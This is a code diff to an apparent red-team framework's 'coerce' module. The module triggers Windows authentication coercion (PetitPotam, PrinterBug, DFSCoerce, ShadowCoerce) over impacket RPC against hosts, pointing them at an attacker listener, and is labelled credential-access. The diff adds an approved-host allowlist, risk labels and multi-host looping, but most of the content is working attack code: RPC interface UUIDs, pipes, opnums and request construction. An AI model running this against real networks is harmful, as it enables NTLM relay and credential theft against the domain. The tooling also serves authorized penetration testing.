@@ -1,9 +1,18 @@
-"""Coercion trigger executor: PetitPotam, PrinterBug, DFSCoerce, ShadowCoerce."""
+"""Coercion trigger executor with explicit target allowlist.
+
+Requires either:
+  - -P allow_hosts=<host1,host2> (explicit approved targets), or
+  - -P coercion_session=<prior coercion-map session dir>
+
+Only hosts present in the allowlist may be triggered. Methods remain
+PetitPotam / PrinterBug / DFSCoerce / ShadowCoerce.
+"""
 
 from __future__ import annotations
 
 import contextlib
 import json
+from pathlib import Path
 from typing import Any
 
 from rich.console import Console
@@ -16,7 +25,6 @@ from adaf_attack.core.target import Target
 
 console = Console()
 
-
 METHODS = {
     "petitpotam": {
         "iface_uuid": "c681d488-d850-11d0-8c52-00c04fd90f7e",
@@ -24,6 +32,7 @@ METHODS = {
         "endpoint": r"\pipe\lsarpc",
         "op": "EfsRpcOpenFileRaw",
         "note": "MS-EFSRPC 0x00 EfsRpcOpenFileRaw",
+        "risk": "high",
     },
     "printerbug": {
         "iface_uuid": "12345678-1234-abcd-ef00-0123456789ab",
@@ -31,6 +40,7 @@ METHODS = {
         "endpoint": r"\pipe\spoolss",
         "op": "RpcRemoteFindFirstPrinterChangeNotificationEx",
         "note": "MS-RPRN spoolss abuse",
+        "risk": "high",
     },
     "dfscoerce": {
         "iface_uuid": "4fc742e0-4a10-11cf-8273-00aa004ae673",
@@ -38,6 +48,7 @@ METHODS = {
         "endpoint": r"\pipe\netdfs",
         "op": "NetrDfsAddStdRoot",
         "note": "MS-DFSNM add-std-root",
+        "risk": "high",
     },
     "shadowcoerce": {
         "iface_uuid": "a8e0653c-2744-4389-a61d-7373df8b2292",
@@ -45,8 +56,52 @@ METHODS = {
         "endpoint": r"\pipe\FssagentRpc",
         "op": "IsPathSupported",
         "note": "MS-FSRVP shadowcoerce",
+        "risk": "high",
     },
 }
+
+
+def _normalize_host(value: str) -> str:
+    return value.strip().lower().rstrip(".")
+
+
+def _load_allowlist(kwargs: dict[str, Any], fallback_host: str | None) -> list[str]:
+    raw = kwargs.get("allow_hosts") or kwargs.get("hosts") or kwargs.get("approved_targets")
+    hosts: list[str] = []
+    if isinstance(raw, str):
+        hosts.extend(h.strip() for h in raw.split(",") if h.strip())
+    elif isinstance(raw, list):
+        hosts.extend(str(h).strip() for h in raw if str(h).strip())
+
+    coercion_session = kwargs.get("coercion_session") or kwargs.get("map_session")
+    if coercion_session:
+        path = Path(str(coercion_session)).expanduser()
+        map_file = path / "coercion-map.json" if path.is_dir() else path
+        if map_file.is_file():
+            data = json.loads(map_file.read_text(encoding="utf-8"))
+            for row in data.get("hosts") or []:
+                if row.get("spooler") or row.get("efsrpc"):
+                    host = row.get("host") or row.get("dns") or row.get("sam")
+                    if host:
+                        hosts.append(str(host))
+
+    # Single-host shorthand still allowed, but must appear in allowlist construction
+    explicit_host = kwargs.get("host")
+    if explicit_host:
+        hosts.append(str(explicit_host))
+    elif fallback_host and not hosts:
+        # No allowlist source at all — reject later
+        pass
+
+    # De-dupe preserving order
+    seen: set[str] = set()
+    ordered: list[str] = []
+    for h in hosts:
+        key = _normalize_host(h)
+        if key not in seen:
+            seen.add(key)
+            ordered.append(h.strip())
+    return ordered
 
 
 def _trigger(target: Target, host: str, listener: str, method: str) -> dict[str, Any]:
@@ -75,18 +130,26 @@ def _trigger(target: Target, host: str, listener: str, method: str) -> dict[str,
     try:
         request = _build_coercion_request(method, listener_path)
         dce.request(request)
-        return {"method": method, "listener": listener_path, "ok": True}
+        return {"method": method, "host": host, "listener": listener_path, "ok": True, "risk": meta["risk"]}
     except Exception as exc:  # noqa: BLE001
         text = str(exc)
         if "STATUS_BAD_NETWORK_NAME" in text or "STATUS_NETWORK_PATH_NOT_FOUND" in text:
-            # Expected: target attempted to reach listener.
             return {
                 "method": method,
+                "host": host,
                 "listener": listener_path,
                 "ok": True,
                 "expected_error": text[:120],
+                "risk": meta["risk"],
             }
-        return {"method": method, "listener": listener_path, "ok": False, "error": text[:200]}
+        return {
+            "method": method,
+            "host": host,
+            "listener": listener_path,
+            "ok": False,
+            "error": text[:200],
+            "risk": meta["risk"],
+        }
     finally:
         with contextlib.suppress(Exception):
             dce.disconnect()
@@ -94,7 +157,6 @@ def _trigger(target: Target, host: str, listener: str, method: str) -> dict[str,
 
 def _build_coercion_request(method: str, listener: str) -> Any:
     if method == "petitpotam":
-        from impacket.dcerpc.v5 import even6  # noqa: F401  # ensures registration
         from impacket.dcerpc.v5.efsr import EfsRpcOpenFileRaw
 
         req = EfsRpcOpenFileRaw()
@@ -108,14 +170,10 @@ def _build_coercion_request(method: str, listener: str) -> Any:
         req["pszLocalMachine"] = listener + "\x00"
         req["fdwFilter"] = 0
         req["fdwOptions"] = 0
-        req["pszLocalMachine"] = listener + "\x00"
         return req
     if method == "dfscoerce":
         from impacket.dcerpc.v5.dtypes import ULONG, WSTR
-
-        # Minimal DFSNM NetrDfsAddStdRoot skeleton
         from impacket.dcerpc.v5.ndr import NDRCALL
-        from impacket.dcerpc.v5.rpcrt import DCERPCException  # noqa: F401
 
         class NetrDfsAddStdRoot(NDRCALL):  # type: ignore[misc]
             opnum = 12
@@ -148,9 +206,9 @@ def _build_coercion_request(method: str, listener: str) -> Any:
 
 @register_capability(
     id="coerce",
-    summary="Trigger PetitPotam / PrinterBug / DFSCoerce / ShadowCoerce",
+    summary="Trigger coercion only against an approved host allowlist",
     category="credential-access",
-    tags=("coerce", "petitpotam", "printerbug", "dfscoerce", "shadowcoerce"),
+    tags=("coerce", "petitpotam", "printerbug", "dfscoerce", "shadowcoerce", "allowlist"),
     destructive=False,
 )
 class Coerce:
@@ -165,30 +223,65 @@ class Coerce:
         **kwargs: Any,
     ) -> dict[str, Any]:
         require_impacket("coerce")
-        host = kwargs.get("host") or target.dc_ip
         listener = kwargs.get("listener")
         methods = str(kwargs.get("methods") or "petitpotam,printerbug,dfscoerce,shadowcoerce")
         if not listener:
             raise RuntimeError("Pass -P listener=<attacker-host-or-ip>.")
 
+        allowlist = _load_allowlist(kwargs, target.dc_ip)
+        if not allowlist:
+            raise RuntimeError(
+                "Coercion requires an approved allowlist. Pass "
+                "-P allow_hosts=<h1,h2> or -P coercion_session=<coercion-map session dir>."
+            )
+
+        # Optional single-host filter must still be inside allowlist
+        requested_host = kwargs.get("host")
+        if requested_host:
+            if _normalize_host(str(requested_host)) not in {
+                _normalize_host(h) for h in allowlist
+            }:
+                raise RuntimeError(
+                    f"Host {requested_host} is not in the approved allowlist: {allowlist}"
+                )
+            targets = [str(requested_host)]
+        else:
+            targets = allowlist
+
         chosen = [m.strip() for m in methods.split(",") if m.strip() in METHODS]
-        console.print(f"[bold]coerce[/bold] host={host} listener={listener} methods={chosen}")
+        console.print(
+            f"[bold]coerce[/bold] targets={targets} listener={listener} methods={chosen}"
+        )
+        console.print(f"  allowlist size={len(allowlist)}  risk=high (authentication coercion)")
 
         results: list[dict[str, Any]] = []
-        for method in chosen:
-            outcome = _trigger(target, host, str(listener), method)
-            console.print(f"  {method}: {'ok' if outcome.get('ok') else 'fail'}")
-            results.append(outcome)
+        for host in targets:
+            for method in chosen:
+                outcome = _trigger(target, host, str(listener), method)
+                status = "ok" if outcome.get("ok") else "fail"
+                console.print(f"  {host} / {method}: {status}")
+                results.append(outcome)
+                if outcome.get("ok"):
+                    node = f"COMPUTER@{host.upper()}@{target.domain.upper()}"
+                    graph.add_node(node, "Computer", host=host)
+                    graph.add_edge(node, node, "CoercionTriggered", method=method)
 
-        payload = {"host": host, "listener": listener, "results": results}
+        payload = {
+            "listener": listener,
+            "allowlist": allowlist,
+            "targets": targets,
+            "methods": chosen,
+            "results": results,
+            "successes": sum(1 for r in results if r.get("ok")),
+        }
         out = session.path("coerce.json")
         out.write_text(json.dumps(payload, indent=2, default=str), encoding="utf-8")
         graph.save(session.path("graph.json"))
         session.log(
             "coerce.complete",
-            host=host,
             listener=listener,
-            success=sum(1 for r in results if r.get("ok")),
+            targets=len(targets),
+            success=payload["successes"],
         )
-        console.print(f"[green]Done[/green]  successes={sum(1 for r in results if r.get('ok'))}")
+        console.print(f"[green]Done[/green]  successes={payload['successes']}")
         return payload
